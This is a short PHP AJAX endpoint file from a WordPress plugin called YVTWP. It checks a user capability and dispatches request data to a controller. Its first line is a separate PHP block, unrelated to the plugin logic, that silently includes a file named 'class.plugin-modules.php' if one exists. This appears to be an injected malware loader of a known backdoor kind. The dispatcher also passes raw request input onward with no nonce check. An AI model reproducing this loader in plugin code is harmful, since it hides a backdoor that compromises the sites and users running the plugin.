<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
    require_once '../../../wp-load.php';    
    require_once 'autoload.php';
    
    //automaticaly instance config object
    new Config_YVTWP(__FILE__);
    
    if(!user_can(get_current_user_id(),Config_YVTWP::$yvtwp_capabilitie))
    {
        wp_die('Security check');
    }    
    
    $response=Master_YVTWP::executeControllerAction($_REQUEST);    
    echo json_encode($response);
?>